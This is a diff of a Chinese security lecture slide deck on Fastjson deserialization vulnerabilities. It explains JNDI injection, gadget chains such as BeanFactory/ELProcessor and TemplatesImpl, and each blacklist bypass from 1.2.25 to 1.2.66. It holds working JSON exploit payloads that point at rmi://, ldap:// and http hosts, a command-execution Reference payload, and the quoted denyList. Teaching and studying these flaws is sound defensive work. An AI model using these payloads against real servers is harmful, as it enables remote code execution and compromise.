@@ -43,7 +43,7 @@ class: center, middle
 
 # /fastjson/ 反序列化漏洞专题
 
-.footnote[[*] Miao Jiahao / 2020.4.7]
+.footnote[[*] Miao Jiahao / 2020.4.11]
 
 ---
 
@@ -51,35 +51,27 @@ class: center, middle
 
 1. 知识铺垫
     * Java中的序列化与反序列化
-    * JNDI与JNDI注入
-    * RMI, LDAP, JDNI
-2. Fastjson介绍
-3. Fastjson序列化与反序列化规则
-4. Fastjson漏洞发展历程及利用
+    * RMI与JNDI
+    * JNDI注入
+    * Fastjson介绍、序列化与反序列化规则
+2. Fastjson漏洞发展历程及利用
     * version 1.2.24 & 6种POC
-    * version 1.2.25 黑名单机制与绕过
-    * version 1.2.42 补丁与绕过
-    * version 1.2.44 补丁与绕过
-    * version 1.2.46 补丁与绕过
-5. Fastjson漏洞的未来
+    * version 1.2.25 补丁与绕过
+    * version 1.2.45 补丁与绕过
+    * version 1.2.47 补丁与绕过
+    * version 1.2.58 补丁与绕过
+    * version 1.2.61 补丁与绕过
+    * version 1.2.62 补丁与绕过
+    * version 1.2.66 补丁与绕过
+3. 总结
 
 ---
 ## Java中的序列化与反序列化
-
---
-
 什么是序列化与反序列化
---
-
 * 序列化：将Java对象写入到IO流并转换成字节序列（byte数组）
 * 反序列化：从字节序列还原回Java对象
 
---
-
 为什么需要序列化与反序列化
-
---
-
 * 需要储存和还原对象状态
 * 需要在网络、进程之间进行传输
 * JSON/XML等数据交互格式不能满足复杂数据类型的传输需要
@@ -211,10 +203,9 @@ public class Client {
 ---
 为什么会造成命令执行
 
---
-
 ```java
-Exception in thread "main" javax.naming.NamingException [Root exception is java.lang.ClassCastException: ExecTest cannot be cast to javax.naming.spi.ObjectFactory]
+Exception in thread "main" javax.naming.NamingException [Root exception is java.lang.
+    ClassCastException: ExecTest cannot be cast to javax.naming.spi.ObjectFactory]
 *	at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:507)
 	at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:138)
 *	at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)
@@ -527,8 +518,92 @@ public static void main(String[] args) throws NamingException, RemoteException, 
 ```
 
 ---
+到底发生了什么
+```java
+Reference ref = null;
+*if (refInfo instanceof Reference) {
+    ref = (Reference) refInfo;
+} else if (refInfo instanceof Referenceable) {
+    ref = ((Referenceable)(refInfo)).getReference();
+}
+
+Object answer;
+
+if (ref != null) {
+    String f = ref.getFactoryClassName();
+    if (f != null) {
+        // if reference identifies a factory, use exclusively
+*        factory = getObjectFactoryFromReference(ref, f);
+        if (factory != null) {
+*            return factory.getObjectInstance(ref, name, nameCtx,
+                                             environment);
+        }
+...
+}
+```
+客户端发起lookup请求后，会判断获取到的对象是否是Reference
+
+---
+RMI-Server中攻击者注册的Reference对象
+```java
+ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", 
+    "", true,"org.apache.naming.factory.BeanFactory",null);
+
+ref.add(new StringRefAddr("forceString", "x=eval"));
+
+ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").
+    newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.
+    ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','/System/Applications/
+    Calculator.app/Contents/MacOS/Calculator']).start()\")"));
+
+ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
+```
+在Payload中攻击者指定Factory为org.apache.naming.factory.BeanFactory，因此在客户端会获取BeanFactory并调用其getObjectInstance方法
+---
+apache-tomcat-8.5.53-src/java/org/apache/naming/factory/BeanFactory.java
+```java
+Method method = forced.get(propName);
+if (method != null) {
+    valueArray[0] = value;
+    try {
+*        method.invoke(bean, valueArray); // method => javax.el.ELProcessor.eval
+    } catch (IllegalAccessException|
+             IllegalArgumentException|
+             InvocationTargetException ex) {
+        throw new NamingException
+            ("Forced String setter " + method.getName() +
+             " threw exception for property " + propName);
+    }
+    continue;
+}
+```
+BeanFactory的getObjectInstance方法中存在反射，而反射的方法和参数均可控，来自Reference的属性，利用链为：
+1. RMI-Server中注册一个精心构建的ResourceRef对象
+2. ResourceRef在被Client查询到时，Client根据ResourceRef寻找对应的工厂类
+3. 工厂类为BeanFactory，Client调用BeanFactory的getObjectInstance方法
+4. 在此过程中BeanFactory会在Reference中取属性值，并使用这些值完成反射操作
+5. 选取能够命令执行的类和方法（如ELProcessor）实现命令执行
+
+---
 ## LDAP Java Serialized Data
-在BlackHat2016的演讲中还提到过LDAP可以返回Java Serialized Data，当对象的javaSerilizedData属性非空时，obj.decodeObject方法会直接对字段内容进行反序列化
+/Library/Java/JavaVirtualMachines/jdk1.8.0_192.jdk/Contents/Home/jre/lib/rt.jar!/com/sun/jndi/ldap/Obj.class
+```java
+try {
+    Attribute var1;
+*    if ((var1 = var0.get(JAVA_ATTRIBUTES[1])) != null) {  // JAVA_ATTRIBUTES[1] -> javaSerializedData
+        ClassLoader var3 = helper.getURLClassLoader(var2);
+*        return deserializeObject((byte[])((byte[])var1.get()), var3);
+    } else if ((var1 = var0.get(JAVA_ATTRIBUTES[7])) != null) {
+        return decodeRmiObject((String)var0.get(JAVA_ATTRIBUTES[2]).get(), (String)var1.get(), var2);
+    } else {
+        var1 = var0.get(JAVA_ATTRIBUTES[0]);
+        return var1 == null || !var1.contains(JAVA_OBJECT_CLASSES[2]) && !var1.contains(JAVA_OBJECT_CLASSES_LOWER[2]) ? null : decodeReference(var0, var2);
+    }
+}
+```
+当LDAP查询返回的对象存在javaSerilizedData属性时，会对其进行反序列化
+
+这条利用链需要借助服务器上存在反序列化漏洞的Jar，整体流程为：fastjson触发JNDI注入->JNDI注入查询LDAP->LDAP触发某些类的反序列化->反序列化操作引发命令执行
 
 ---
 ## 特殊类
@@ -547,8 +622,239 @@ Payload
 	"_outputProperties": {}
 }
 ```
+.footnote[[*] 需要开启Feature.SupportNonPublicField配置项]
 
 ---
+利用关键：设置_outputProperties属性过程会触发getOutputProperties方法
+```java
+public synchronized Properties getOutputProperties() {
+    try {
+*        return newTransformer().getOutputProperties();
+    }
+    catch (TransformerConfigurationException e) {
+        return null;
+    }
+}
+```
+.footnote[[*] fastjson的smartMatch机制能够忽略属性前的下划线完成赋值]
+
+.footnote[[*] 为什么反序列化操作这里会触发getter方法]
+---
+跟进newTransformer()
+
+```java
+public synchronized Transformer newTransformer()
+        throws TransformerConfigurationException
+    {
+        TransformerImpl transformer;
+
+*        transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
+            _indentNumber, _tfactory);
+
+        if (_uriResolver != null) {
+            transformer.setURIResolver(_uriResolver);
+        }
+
+        if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) {
+            transformer.setSecureProcessing(true);
+        }
+        return transformer;
+    }
+```
+---
+跟进getTransletInstance()
+```java
+private Translet getTransletInstance()
+        throws TransformerConfigurationException {
+        try {
+            if (_name == null) return null;
+
+*            if (_class == null) defineTransletClasses();
+
+            // The translet needs to keep a reference to all its auxiliary
+            // class to prevent the GC from collecting them
+            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
+            translet.postInitialization();
+```
+---
+跟进defineTransletClasses()
+```java
+for (int i = 0; i < classCount; i++) {
+*    _class[i] = loader.defineClass(_bytecodes[i]);
+    final Class superClass = _class[i].getSuperclass();
+
+    // Check if this is the main class
+    if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
+        _transletIndex = i;
+    }
+    else {
+        _auxClasses.put(_class[i].getName(), _class[i]);
+    }
+}
+```
+在这里根据_bytecodes定义了类，随后这个类会被生成实例，也就造成了命令执行
+
+回过头看，我们是否能够控制私有的_bytecodes属性？ -> 需要开启Feature.SupportNonPublicField
+
+```java
+Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
+```
+---
+## Version 1.2.25修复
+
+.image-scale[![](img/image-20200410234925624.png)]
+
+v1.2.25与v1.2.24相比，引入了checkAutoType方法用于校验反序列化的类
+
+fastjson的攻防从此转到了校验方法的绕过上
+
+---
+v1.2.25 checkAutoType
+```java
+public Class<?> checkAutoType(String typeName, Class<?> expectClass) {
+    if (typeName == null) {
+        return null;
+    }
+    final String className = typeName.replace('$', '.');
+    if (autoTypeSupport || expectClass != null) {
+        for (int i = 0; i < acceptList.length; ++i) {
+*            String accept = acceptList[i];
+            if (className.startsWith(accept)) {
+                return TypeUtils.loadClass(typeName, defaultClassLoader);
+            }
+        }
+
+        for (int i = 0; i < denyList.length; ++i) {
+*            String deny = denyList[i];
+            if (className.startsWith(deny)) {
+                throw new JSONException("autoType is not support. " + typeName);
+            }
+        }
+    }
+```
+白名单+黑名单机制（默认白名单），寻找一下黑名单
+
+---
+黑名单是直接明文写在[ParserConfig.java](https://github.com/alibaba/fastjson/blob/d9bc118f8f91deb696e7265f1d6a4af25880364f/src/main/java/com/alibaba/fastjson/parser/ParserConfig.java)中的
+```java
+private String[] denyList = 
+    "bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,
+    javax.xml,org.apache.bcel,org.apache.commons.beanutils,
+    org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,
+    org.apache.commons.collections4.comparators,org.apache.commons.fileupload,
+    org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,
+    org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework".split(",");
+```
+禁用掉`com.sun`的包，我们之前的payload都不能用了
+
+---
+v1.2.25绕过
+```java
+if (autoTypeSupport || expectClass != null) {
+    for (int i = 0; i < acceptList.length; ++i) {
+*            String accept = acceptList[i];
+        if (className.startsWith(accept)) {
+*            return TypeUtils.loadClass(typeName, defaultClassLoader);
+        }
+    }
+```
+在[TypeUtils.loadClass](https://github.com/alibaba/fastjson/blob/d9bc118f8f91deb696e7265f1d6a4af25880364f/src/main/java/com/alibaba/fastjson/util/TypeUtils.java)方法中其实还有其他操作
+
+```java
+if (className.startsWith("L") && className.endsWith(";")) {
+    String newClassName = className.substring(1, className.length() - 1);
+    return loadClass(newClassName, classLoader);
+}
+```
+首先进行黑名单判定，确定不在黑名单后使用loadClass处理：loadClass在遇到以“L”开始并以“;”结尾的类时，会自动递归去除掉首尾字符
+
+绕过：`{"@type":"Lcom.sun.rowset.RowSetImpl;","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}`
+
+---
+## v1.2.42补丁
+传入前判断，将首尾的L和;去除（无效补丁）
+```java
+if ((((BASIC
+    ^ className.charAt(0))
+    * PRIME)
+    ^ className.charAt(className.length() - 1))
+    * PRIME == 0x9198507b5af98f0L)
+{
+    className = className.substring(1, className.length() - 1);
+}
+```
+--
+
+绕过：LLcom.sun.rowset.RowSetImpl;;
+
+---
+## v1.2.42补丁
+denyList改哈希值
+.image-scale[![](img/image-20200411002000317.png)]
+
+---
+安全工程师的反制
+.image-scale[![](img/image-20200411005234842.png)]
+
+---
+## 之后的绕过
+
+v1.2.45 黑名单绕过
+```json
+{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
+"properties":{"data_source":"ldap://localhost:9999/Exploit"}}
+```
+
+
+v1.2.47 checkAutoType绕过，无视autoType选项
+```json
+{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},
+"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://localhost:1389/Exploit","autoCommit":true}}}
+```
+---
+v1.2.58 黑名单绕过
+```json
+{"@type":"ch.qos.logback.core.db.DriverManagerConnectionSource", "url":
+"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'"}
+```
+
+v1.2.61 黑名单绕过
+```json
+{"@type":"org.apache.commons.configuration2.JNDIConfiguration","prefix":"rmi://127.0.0.1:1099/Exploit"}
+```
+* source/commons-configuration-1.9/org/apache/commons/configuration/JNDIConfiguration.java containsKey
+* source/commons-configuration-1.9/org/apache/commons/configuration/JNDIConfiguration.java getProperty
+* source/HikariCP-3.3.1/com/zaxxer/hikari/HikariConfig.java getObjectOrPerformJndiLookup
+* source/ojdbc14-10.2.0.2/oracle/jdbc/connector/OracleManagedConnectionFactory.java setupXADataSource
+* source/xalan-2.7.2/org/apache/xalan/lib/sql/JNDIConnectionPool.java findDatasource
+
+---
+
+v1.2.62 黑名单绕过
+
+```json
+{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://127.0.0.1:1099/exploit"}
+```
+
+v1.2.66 黑名单绕过(补丁显示有10+Gadgets)
+```json
+{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig",
+"properties": {"@type":"java.util.Properties","UserTransaction":"rmi://127.0.0.1:1099/tr1ple"}}
+```
+---
+## 总结
+.image-scale[![](img/fastjson.png)]
+
+Fastjson的安全状况：
+1. 不开启autoType的情况下基本安全，除非存在特殊的绕过
+2. 开启autoType的情况下靠当前的黑名单机制仍然存在很大风险（野生0day）
+3. 未来的绕过方向大概率是寻找特殊类
+
+---
+
+
+class: center, middle
+# Questions?
 
         </textarea>
         <script src="https://remarkjs.com/downloads/remark-latest.min.js"></script>
